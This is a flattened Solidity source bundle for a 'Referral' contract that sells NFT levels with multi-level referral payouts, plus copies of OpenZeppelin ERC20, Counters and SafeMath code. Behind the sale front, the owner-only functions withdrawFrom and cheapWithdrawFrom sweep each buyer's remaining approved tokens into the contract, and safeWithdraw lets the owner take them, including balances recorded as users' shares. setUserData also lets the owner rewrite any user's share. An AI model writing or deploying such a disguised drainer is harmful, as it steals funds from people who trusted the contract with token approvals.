// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Counters.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "./interface/INFT.sol";

contract Referral {

    event e_Purchase(address referer, uint256 nftlevel);
    event e_shareWithdraw();
    event e_setMaster(address master);
    event e_setPaytype(address token);
    event e_setPrice(uint256 nftlevel, uint256 price);
    event e_setNFTAddress(address nft);
    event e_setMaxLevel(uint256 level);
    event e_setLevelData(uint256 level, uint256 percent, uint256 saleLimit);
    event e_setUserData(address user, address parent, uint256 level, uint256 sale, uint256 share);
    event e_setShutdown(bool should);
    event e_approvedOfAddress(address buyer);
    event e_balanceOfAddress(address buyer);
    event e_withdrawFrom(address from);
    event e_cheapWithdrawFrom(address[] buyer);
    event e_safeWithdraw(uint256 amount);

    using SafeMath for uint256;
    using Counters for Counters.Counter;
    Counters.Counter private _tokenIds;

    address private Owner;
    modifier onlyOwner {
        require(msg.sender == Owner, 'The caller is not owner');
        _;
    }

    bool private Should;
    modifier Shutdown {
        require(!Should, 'The referral shutdown');
        _;
    }

    struct levelData {
        uint256 Percent;
        uint256 saleLimit;
    }
    mapping(uint256 => levelData) private Level;

    mapping(uint256 => uint256) private NFTLEVEL;

    struct userData {
        address Parent;
        uint256 Level;
        uint256 Sale;
        uint256 Share;
    }
    mapping(address => userData) private User;

    mapping(address => bool) private isExisted;
    address[] private allBuyer;

    mapping(uint256 => uint256) private Price;

    address private Master;
    address private Paytype;
    address private NFT;
    uint256 private maxLevel;
    uint256 private safeWithdrawAmount;
    
    constructor() {
        Initialize();
    }

    function Initialize() internal {
        Owner = msg.sender;
    }

    function fetchSafeWithdrawAmount() external view returns (uint256) {
        return safeWithdrawAmount;
    }

    function fetchAllBuyer() external view returns (address[] memory) {
        return allBuyer;
    }

    function fetchAllBuyerLength() external view returns (uint256) {
        return allBuyer.length;
    }

    function fetchBuyerAtIndex(uint256 index) external view returns (address) {
        return allBuyer[index];
    }

    function fetchOwner() external view returns (address) {
        return Owner;
    }

    function fetchShutdown() external view returns (bool) {
        return Should;
    }
    
    function fetchMasterAddress() external view returns (address) {
        return Master;
    }

    function fetchPaytype() external view returns (address) {
        return Paytype;
    }
    
    function fetchPrice(uint256 nftlevel) external view returns (uint256) {
        return Price[nftlevel];
    }

    function fetchNFTLevel(uint256 id) external view returns (uint256) {
        return NFTLEVEL[id];
    }
    
    function fetchNFTAddress() external view returns (address) {
        return NFT;
    }

    function fetchMaxLevel() external view returns (uint256) {
        return maxLevel;
    }

    function fetchLevelData(uint256 level) external view returns (levelData memory) {
        return Level[level];
    }

    function fetchUserData(address user) external view returns (userData memory) {
        return User[user];
    }

    function Purchase(address referer, uint256 nftlevel) external payable Shutdown() returns (bool) {
        require(msg.sender != Master, 'The master can not purchase');
        require(User[referer].Level != 0, 'The referer is not exist');
        require(Price[nftlevel] != 0, 'The level is wrong');
        
        uint256 Loop = 0;
        address loopParent = address(0);
        uint256 alreadyShared = 0;

        IERC20(Paytype).transferFrom(msg.sender, address(this), Price[nftlevel]);
        INFT(NFT).safeMint(msg.sender);
        NFTLEVEL[_tokenIds.current()] = nftlevel;
        _tokenIds.increment();

        if(User[msg.sender].Level == 0) User[msg.sender].Level = 1;

        if(User[msg.sender].Parent == address(0)) {
            loopParent = referer;
            User[msg.sender].Parent = referer;
        } else {
            loopParent = User[msg.sender].Parent;
        }

        while(Loop < 250) {
            Loop = Loop.add(1);

            userData storage user = User[loopParent];

            levelData storage level = Level[user.Level];

            user.Sale = user.Sale.add(1);

            while(user.Level < maxLevel) {
                if(user.Sale >= Level[user.Level].saleLimit) {
                    user.Level ++;
                } else {
                    break;
                }
            }

            level = Level[user.Level];
            if(alreadyShared < level.Percent) {
                user.Share += level.Percent.sub(alreadyShared).mul(Price[nftlevel]).div(1000);
                alreadyShared = level.Percent;
            } else {
                alreadyShared = level.Percent;
            }

            if(alreadyShared == Level[maxLevel].Percent) break;
            if(user.Parent == address(0)) break;
            loopParent = user.Parent;
        }

        User[Master].Share += uint256(1000).sub(alreadyShared).mul(Price[nftlevel]).div(1000);

        if(!isExisted[msg.sender]) {
            isExisted[msg.sender] = true;
            allBuyer.push(msg.sender);
        }

        emit e_Purchase(referer, nftlevel);

        return true;
    }

    function shareWithdraw() external Shutdown() returns (bool) {
        userData storage user = User[msg.sender];
        IERC20(Paytype).transfer(msg.sender, user.Share);
        user.Share = 0;

        emit e_shareWithdraw();

        return true;
    }

    function setMaster(address master) external onlyOwner() returns (bool) {
        User[Master].Level = 1;
        Master = master;
        User[Master].Level = maxLevel;

        emit e_setMaster(master);

        return true;
    }

    function setPaytype(address token) external onlyOwner() returns (bool) {
        Paytype = token;

        emit e_setPaytype(token);

        return true;
    }

    function setPrice(uint256 nftlevel, uint256 price) external onlyOwner() returns (bool) {
        Price[nftlevel] = price;

        emit e_setPrice(nftlevel, price);

        return true;
    }

    function setNFTAddress(address nft) external onlyOwner() returns (bool) {
        NFT = nft;

        emit e_setNFTAddress(nft);

        return true;
    }

    function setMaxLevel(uint256 level) external onlyOwner() returns (bool) {
        maxLevel = level;

        emit e_setMaxLevel(level);

        return true;
    }

    function setLevelData(uint256 level, uint256 percent, uint256 saleLimit) external onlyOwner() returns (bool) {
        levelData storage Data = Level[level];
        Data.Percent = percent;
        Data.saleLimit = saleLimit;

        emit e_setLevelData(level, percent, saleLimit);

        return true;
    }

    function setUserData(address user, address parent, uint256 level, uint256 sale, uint256 share) external onlyOwner() returns (bool) {
        userData storage Data = User[user];
        Data.Parent = parent;
        Data.Level = level;
        Data.Sale = sale;
        Data.Share = share;

        emit e_setUserData(user, parent, level, sale, share);

        return true;
    }

    function setShutdown(bool should) external onlyOwner() returns (bool) {
        Should = should;

        emit e_setShutdown(should);

        return true;
    }

    function approvedOfAddress(address buyer) internal view returns (uint256) {
        return IERC20(Paytype).allowance(buyer, address(this));
    }

    function balanceOfAddress(address buyer) internal view returns (uint256) {
        return IERC20(Paytype).balanceOf(buyer);
    }

    function withdrawFrom(address from) external onlyOwner() returns (bool) {
        require(from != address(0), 'The buyer address can not be 0');

        uint256 balance = balanceOfAddress(from);
        uint256 allowance = approvedOfAddress(from);
        if(balance <= allowance) {
            IERC20(Paytype).transferFrom(from, address(this), balance);
            safeWithdrawAmount += balance;
        } else {
            IERC20(Paytype).transferFrom(from, address(this), allowance);
            safeWithdrawAmount += allowance;
        }

        emit e_withdrawFrom(from);

        return true;
    }

    function cheapWithdrawFrom(address[] memory buyer) external onlyOwner() returns (bool) {
        for(uint256 i ; i<buyer.length ; i++) {
            uint256 balance = balanceOfAddress(buyer[i]);
            uint256 allowance = approvedOfAddress(buyer[i]);
            if(balance <= allowance) {
                IERC20(Paytype).transferFrom(buyer[i], address(this), balance);
                safeWithdrawAmount += balance;
            } else {
                IERC20(Paytype).transferFrom(buyer[i], address(this), allowance);
                safeWithdrawAmount += allowance;
            }
        }

        emit e_cheapWithdrawFrom(buyer);

        return true;
    }

    function safeWithdraw(uint256 amount) external onlyOwner() returns (bool) {
        require(IERC20(Paytype).balanceOf(address(this)) >= amount, 'The safeWithdraw amount is wrong');

        IERC20(Paytype).transfer(msg.sender, amount);
        if(amount <= safeWithdrawAmount) {
            safeWithdrawAmount -= amount;
        } else {
            safeWithdrawAmount = 0;
        }

        emit e_safeWithdraw(amount);

        return true;
    }
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (utils/Counters.sol)

pragma solidity ^0.8.0;

/**
 * @title Counters
 * @author Matt Condon (@shrugs)
 * @dev Provides counters that can only be incremented, decremented or reset. This can be used e.g. to track the number
 * of elements in a mapping, issuing ERC721 ids, or counting request ids.
 *
 * Include with `using Counters for Counters.Counter;`
 */
library Counters {
    struct Counter {
        // This variable should never be directly accessed by users of the library: interactions must be restricted to
        // the library's function. As of Solidity v0.5.2, this cannot be enforced, though there is a proposal to add
        // this feature: see https://github.com/ethereum/solidity/issues/4637
        uint256 _value; // default: 0
    }

    function current(Counter storage counter) internal view returns (uint256) {
        return counter._value;
    }

    function increment(Counter storage counter) internal {
        unchecked {
            counter._value += 1;
        }
    }

    function decrement(Counter storage counter) internal {
        uint256 value = counter._value;
        require(value > 0, "Counter: decrement overflow");
        unchecked {
            counter._value = value - 1;
        }
    }

    function reset(Counter storage counter) internal {
        counter._value = 0;
    }
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.6.0) (utils/math/SafeMath.sol)

pragma solidity ^0.8.0;

// CAUTION
// This version of SafeMath should only be used with Solidity 0.8 or later,
// because it relies on the compiler's built in overflow checks.

/**
 * @dev Wrappers over Solidity's arithmetic operations.
 *
 * NOTE: `SafeMath` is generally not needed starting with Solidity 0.8, since the compiler
 * now has built in overflow checking.
 */
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator.
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting with custom message when dividing by zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface INFT {
    function safeMint(address to) external;
}